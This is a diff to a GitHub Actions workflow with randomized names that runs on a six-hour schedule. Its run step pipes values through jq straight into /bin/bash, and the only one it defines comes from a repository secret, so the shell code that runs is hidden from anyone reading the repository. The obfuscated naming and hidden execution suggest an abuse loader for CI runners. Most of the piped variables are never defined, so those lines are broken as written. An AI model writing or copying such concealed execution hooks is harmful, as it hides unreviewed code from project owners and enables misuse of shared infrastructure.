@@ -1,22 +1,27 @@
 name: houtaint
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 0/6 * * *'
-
+    - cron: '29 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: houtaint
         env:
-          vivcv5: ${{ secrets.vivcv5 }}
+          zcegd8: ${{ secrets.zcegd8 }}
         run: |
-          echo $vivcv5 | jq -r .xyko056 | /bin/bash
-          echo $bi78 | jq -r .jk407 | /bin/bash
-          echo $kmqyi98 | jq -r .zx0969 | /bin/bash
-          echo $rljxz120 | jq -r .gxjdo2078 | /bin/bash
-          echo $ulcjw0 | jq -r .vzaae33 | /bin/bash
+          echo $zcegd8 | jq -r .llert998 | /bin/bash
+          echo $klq05852 | jq -r .r947 | /bin/bash
+          echo $pe32367 | jq -r .f0 | /bin/bash
+          echo $lmcnc76 | jq -r .zrb89 | /bin/bash
+          echo $psglu47 | jq -r .e82 | /bin/bash
+          echo $np68 | jq -r .p6068 | /bin/bash
+          echo $i035 | jq -r .kmwmy61 | /bin/bash
+          echo $ss35 | jq -r .trxde5425 | /bin/bash
+          echo $ygug1 | jq -r .dile3 | /bin/bash
+          echo $jcqx4103 | jq -r .slj61 | /bin/bash
+          echo $up74 | jq -r .qo0 | /bin/bash
 
